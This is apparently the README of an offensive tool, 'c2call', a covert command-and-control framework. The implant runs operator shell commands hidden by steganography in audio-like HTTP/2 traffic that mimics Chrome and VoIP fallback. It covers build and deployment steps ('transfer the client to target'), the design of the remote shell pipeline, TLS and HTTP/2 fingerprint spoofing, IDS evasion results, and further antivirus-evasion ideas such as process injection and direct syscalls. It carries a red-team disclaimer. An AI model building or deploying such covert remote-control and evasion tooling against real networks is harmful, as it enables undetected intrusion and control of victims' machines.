# c2call
A covert command-and-control framework that tunnels encrypted shell commands through LSB-encoded audio bytes, over a persistent HTTP/2 stream, mimicking TCP/443 fallback behaviour of VoIP applications in enterprise envs, where UDP is restricted.

> **Educationl/Research Use only**. This tool is intended for authorized red team engagements, CTF competitions, and security researches in controlled environments. Do not use it against systems you do not have explicit wirtten permissions to test.

## Setup

```sh
#replace in your go.mod
replace golang.org/x/net => github.com/ajithor/http2chrome v0.0.3

#generate cert
openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -sha256 -days 365 -nodes -subj "/CN=c2call.local"
#edit the config file
GOOS=linux GOARCH=amd64 go build -o server server.go data_transform_helper.go
GOOS=linux GOARCH=amd64 go build -o client client.go data_transform_helper.go

./server -debug off
#transfer the client to target
./client -target <IP> [-peet true]
```
---
## Overview
c2call hides C2 traffic inside what looks like a Chrome browzer on a VoIP audio call that has fallen back to TCP/443, which is a completely normal occurance in enterprise environments where UDP is blocked by firewall policies. Teams, Zoom, Webex all document this fallback behaviour.

The payload is the operator commands outbound, and shell output inbout to c2. These are encoded bit-by-bit into LSB of audio bytes flowing in both directions over a single persistent HTTP/2 stream. No separate C2 channels exists on the wire. The only observable traffic is what appears to be a VoIP client, maintaining an audio call over HTTPS.
- TLS fingerprint identical to Chrome (uTLS `HelloChrome_Auto`)
- HTTP/2 SETTINGS, WINDOW_UPDATE, PRIORITY, and header order match chrome exactly via [http2chrmoe](https://ajithor.github.com/http2chrome).
- Single persistent bidirectional HTTP/2 stream, which means no polling, no discrete requests after initial connection.
- AES-GCM encrypted payload before LSB encoding
- Authentic Chrome request and response headers on both sides
- Beaconing with jitterd reconnection on command or data silence.
- Cross-platform implant (Go, compiles for Linux/Windows/macOS)

---
## Architecture
On Operator(server),

CLI stdin --> AES-GCM encrypt --> LSB encoder --> audio stream to client.

On implant (client),

resp.Body--> LSB decoder --> AES-GCM decrypt --> command extraction --> shell execution --> output --> AES-GCM encrypt --> LSB encode --> pw.Write

Both sides stream LSB-encoded audio continuously over one HTTP/2 request. The operator writes to the downstream audio. The implant writes shell output to the upstream audio. Neither side polls, and data flows as it arrives.

---
## AES-GCM + Steganography engine
### Command/output Encoding
command string --> AES-GCM encrypt --> "STRT"+command+"STOP" --> convert each char into 8 bits. -->For each bit b, for each audio byte s: s= (s &0xFE)|b (overwrite LSB) -->Modified audio bytes streamed over HTTP/2

### Output/command Decoding
Incoming audio bytes --> check for first 4 bytes of each chunk for "STRT". If it doesnt exist, move on to next chunk. If it exists -> extract LSB of each byte -> append to bit buffer --> every 8 bits assembled to byte -> cast to char till you see "STOP"--> AES-GMC decrypt.

### Encryption specifics
- key - 16, 24 or 32 bytes (AES-128/192/256) (code has hardcoded 16-byte key)
- nonce - 12 random bytes per message (crypto/rand)
- overhead - 28 butes (12 nonce + 16 tag)
- padding - none required, since this is CTR mode, so ciphertext length = plaintext length
- Nonce is prepended to ciphertext and travels with it - `Seal(nonce, nonce, plaintext, nil)` (`(nonce || ciphertext || tag)`)
- Decryption splits the first 12 bytes as nonce, remainder as ciphertext.
- Key distribution - symmetric key is currently hardcoded at compile time.

---
## Traffic Evasion
### TLS fingerprint
uTLS `HelloChrome_Auto` produces a byte-accurate Chrome ClientHello. The cipher suits, extensions, elliptic curves and GREASE valies are hence all identical to real chrome browzer.
### HTTP/2 fingreprint
[http2chrome](https://github.com/ajithor/http2chrome) is a fork of `golang.org/x/net`, which matches Chrome's exact HTTP/2 wire behaviour, and a verified akamai finderprint `1:65536;2:0;4:6291456;6:262144|15663105|0|m,a,s,p`

| Component              | Go default   | Chrome (c2call)        |
| ---------------------- | ------------ | --------------------- |
| SETTINGS order         | 2,4,5,6      | 1,2,4,6               |
| HEADER_TABLE_SIZE      | 4096         | 65536                 |
| INITIAL_WINDOW_SIZE    | 65535        | 6291456               |
| MAX_HEADER_LIST_SIZE   | 10485760     | 262144                |
| MAX_CONCURRENT_STREAMS | sent         | not sent              |
| MAX_FRAME_SIZE         | sent         | not sent              |
| WINDOW_UPDATE          | ~1GB         | 15663105              |
| PRIORITY frames        | none         | none (Chrome 124+)    |
| Pseudo-header order    | a,m,p,s      | m,a,s,p               |
| Header order           | map (random) | Chrome observed order |
### HTTP headers
Request and response headers are handcrafted on both sides to mimic Chrome's exact field names, values and ordering.
### The overall cover
Single persistent `POST /stream` over port 443 with continuous bidirectional audio-sized data flow matches the TCP/443 fallback of enterprise VoIP clients (like Teams, Zoom, or Webex), when UPD is unavailable. The traffic pattern is indinguishable from a legitimate audio call at the network layer.

---
## Beaconing
c2call reconnects automatically on two conditions-
- Data silence (10s) --> connextion is probably dead, or network issue
- Command silence (60s) --> operator idle, beacon interval

After disconnection, the implant sleeps for a jittered interval (60-90 seconds), before attempting to re-establish the stream.

---
## Verification

### HTTP/2 Fingerprint
Verified against [tls.peet.ws](https://tls.peet.ws/api/all) — hit the 
endpoint from c2call client and compare the returned Akamai fingerprint 
string against Chrome's expected value.

peet is automatically done with the `-peet true` option while invoking the implant. 

Pipe it and grep it to look at the signature `./client -target 127.0.0.1 -peet true | grep -i akamai`

Expected: `1:65536;2:0;4:6291456;6:262144|15663105|0|m,a,s,p`

Matches Chrome 124–147 as documented in 
[curl-impersonate signatures](https://github.com/lexiforest/curl-impersonate/tree/main/tests/signatures).

### IDS/IPS Evasion

Tested against pfSense + Suricata with Emerging Threats Open ruleset 
(ETOpen, August 2026) including:
- emerging-botcc.rules
- emerging-malware.rules
- emerging-threatview_CS_c2.rules
- emerging-ja3.rules
- emerging-hunting.rules
- emerging-user_agents.rules

**Result: zero alerts** on c2all traffic across a full command/response 
session. Traffic was indistinguishable from background HTTPS at the 
rule-matching layer.

> Note: ETOpen is a community ruleset. Enterprise-grade products (Palo Alto, Crowdstrike, Darktrace) with behavioural analytics and ML-based detection are outside the scope of this test.

---
## Dependencies
| Package                                 | Purpose                                 |
| --------------------------------------- | --------------------------------------- |
| `github.com/refraction-networking/utls` | Chrome TLS fingerprint                  |
| `github.com/ajithor/http2chrome`		  | Chrome HTTP/2 fingerprint               |
| `github.com/chzyer/readline`            | Operator CLI with arrow key support     |
| `golang.org/x/net/http2`                | HTTP/2 transport (via http2chrome fork) |

---
## Limitations
### Symmetric key
AES-GCM key is currently hardcoded at compile time. Binary capture exposes the key. Something like X25519 + HKDF key exchange would eliminate this without modification to the LSB engin.

### Host layer evasion
c2call addresses network-layer detection only. The Go binary itself is detectable by host-based AV. None of these are in the scope of this project - static string analysis (could use garble to compile the code for this)
- runtime signatures (custom Go runtime would address this)
- import table analysis (direct syscalls would adress this)
- Behavioural detection (something that is dealt by process injection)
- Memory scanning (in-memory execution could evade this to a certain point)